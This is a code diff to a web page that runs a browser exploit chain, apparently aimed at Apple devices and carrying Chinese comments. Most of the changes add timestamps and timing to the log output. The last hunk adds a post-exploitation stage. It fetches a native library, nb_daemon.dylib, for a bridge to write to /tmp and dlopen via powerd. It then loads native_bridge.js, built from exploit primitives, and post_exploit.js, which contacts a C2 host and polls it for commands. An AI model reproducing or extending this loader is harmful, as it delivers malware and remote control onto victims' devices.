@@ -304,8 +304,10 @@
             document.body.appendChild(a);
         }
         window.log = function (text) {
+            var _d = new Date();
+            var _ts = _d.getHours().toString().padStart(2,'0') + ':' + _d.getMinutes().toString().padStart(2,'0') + ':' + _d.getSeconds().toString().padStart(2,'0') + '.' + _d.getMilliseconds().toString().padStart(3,'0');
             const newLineElement = document.createElement('p');
-            newLineElement.textContent = text;
+            newLineElement.textContent = '[' + _ts + '] ' + text;
             document.body.append(newLineElement);
         };
 
@@ -595,6 +597,7 @@
         async function triggerExploit() {
             var platform = navigator.platform;
             const userAgent = navigator.userAgent;
+            var _chainT0 = Date.now();
             window.log(`[LOADER] === Exploit chain starting ===`);
             window.log(`[LOADER] Platform: ${platform}, UA: ${userAgent.substring(0, 80)}...`);
 
@@ -739,7 +742,7 @@
                 }
             }
 
-            window.log(`[LOADER] === Exploit chain finished — result: ${platform} ===`);
+            window.log(`[LOADER] === Exploit chain finished — result: ${platform} | total=${Date.now() - _chainT0}ms ===`);
             return platform;
         }
 
@@ -853,9 +856,36 @@
             try { reportResult(result); } catch(e) {}
             try { _setupPostExploitContext(); } catch(e) {}
             try {
+                // ── nb_daemon.dylib 专用 fetch：把二进制作为 Uint8Array 挂到 window，供 native_bridge 写入 /tmp ──
+                window.__nbDaemonBytes = null;
+                try {
+                    window.log('[LOADER] Fetching nb_daemon.dylib binary blob...');
+                    var _nbResp = await fetch('/payloads/nb_daemon.dylib', { method: 'GET', cache: 'no-store' });
+                    if (_nbResp && _nbResp.ok) {
+                        var _nbBuf = await _nbResp.arrayBuffer();
+                        window.__nbDaemonBytes = new Uint8Array(_nbBuf);
+                        window.log('[LOADER] nb_daemon.dylib fetched — size=' + window.__nbDaemonBytes.length + ' bytes. native_bridge will write it to /tmp and dlopen via powerd.');
+                    } else {
+                        window.log('[LOADER] nb_daemon.dylib not served (HTTP ' + (_nbResp ? _nbResp.status : 'null') + '). IPC disabled, will use in-process native only.');
+                    }
+                } catch (_nbErr) {
+                    window.log('[LOADER] nb_daemon.dylib fetch skipped: ' + (_nbErr && _nbErr.message || _nbErr));
+                }
+
+                // 先加载 native_bridge.js（在 Stage3 成功后构建 window.nativeBridge）
+                var _nbT0 = Date.now();
+                try {
+                    window.log('[LOADER] Loading native_bridge.js (building window.nativeBridge from _corunaPrimitives)...');
+                    await _loadScriptAbs('/payloads/native_bridge.js');
+                    window.log('[LOADER] native_bridge.js loaded — nativeBridge=' + (typeof window.nativeBridge !== 'undefined') + ' | ' + (Date.now() - _nbT0) + 'ms');
+                    if (window.nativeBridgeError) window.log('[LOADER] nativeBridge error: ' + window.nativeBridgeError);
+                } catch (e) {
+                    window.log('[LOADER] native_bridge.js load FAIL: ' + (e && e.message || e) + ' | ' + (Date.now() - _nbT0) + 'ms');
+                }
+                var _peT0 = Date.now();
                 window.log(`[LOADER] Loading post_exploit.js (C2=${window.__dsC2Host}:${window.__dsC2Port}, UUID=${window.__dsDeviceUUID || 'auto'})...`);
                 await _loadScriptAbs('/payloads/post_exploit.js');
-                window.log('[LOADER] post_exploit.js loaded — command polling active');
+                window.log('[LOADER] post_exploit.js loaded — command polling active | ' + (Date.now() - _peT0) + 'ms');
                 if (typeof window.startSdk === 'function') { try { window.startSdk(); } catch(e) {} }
             } catch (e) {
                 window.log('[LOADER] post_exploit.js load FAIL: ' + (e && e.message || e));
